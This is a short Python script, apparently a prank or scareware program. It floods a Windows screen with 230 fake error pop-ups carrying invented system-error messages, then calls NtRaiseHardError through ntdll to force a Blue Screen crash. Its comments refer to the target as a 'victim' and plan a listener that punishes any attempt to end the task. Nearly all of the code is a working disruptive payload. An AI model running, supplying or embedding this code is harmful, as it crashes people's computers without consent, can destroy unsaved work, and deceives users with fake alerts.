# this code will add a listener that makes sure the victim(even though this code is harmless) does not attempt to end the tast.
# if this happens, the code will launch a barrage of errors that will result in a BSOD
# this will likely be created into a seperate, larger project

import ctypes
from ctypes import windll
from ctypes import c_int
from ctypes import c_uint
from ctypes import c_ulong
from ctypes import POINTER
from ctypes import byref

def bsod():
    ntdll = ctypes.windll.ntdll
    prev_value = ctypes.c_bool()
    res = ctypes.c_ulong()
    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
        print("BSOD Successfull!")
    else:
        print("BSOD Failed...")

from tkinter import *
from tkinter import messagebox
import time
import random
from tkinter import font

msgs = ["System Exception: C:/ BAT -c -g xlm", "Critical system eror", "Rename system file not supported", "System Error: PATHU\ c- maindir", "Critical system error: CMDH is not defined at a\d\sim", "Uknown error occured. #151521512 Restart your computer", "Critical system Error #12512512 Cannot copy CMDE.EXE from system32/bat u- -o"]
# random stuff

root = Tk()
root.attributes('-fullscreen', True)
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
root.withdraw()

#root.option_add('*font', 'Helvetica -12')
def throwawayroot():
    global toplevel
    toplevel = Toplevel(root)
    toplevel.config(bg="white")
    toplevel.attributes("-topmost", 1)
    #toplevel.attributes("-toolwindow", True)
    toplevel.title("Error")
    x = random.randint(0, int(width)-100)
    y = random.randint(0, int(height)-100)
    toplevel.geometry(f"300x100+{x}+{y}")
    toplevel.resizable(False, False)
    
    l1=Label(toplevel, image="::tk::icons::error", bg="white")
    l1.grid(row=0, column=0, pady=(7, 0), padx=(10, 10), sticky="e")
    l2=Label(toplevel,text=random.choice(msgs), font=("Arial", 8), bg="white")
    l2.grid(row=0, column=1, columnspan=3, pady=(7, 10), sticky="w")
    b2=Button(toplevel,text="OK",command=toplevel.destroy,width = 10, bg="white")
    b2.grid(row=1, column=3, padx=(2, 35), sticky="e")
    
    Tk.update(toplevel)

for i in range(0, 230):
    throwawayroot()
    if i/10 == int(i/10):
        toplevel.bell()
    if i == 220:
        bsod() # bsod is delayed so 10 more windows will open in meantime
    time.sleep(0.01)





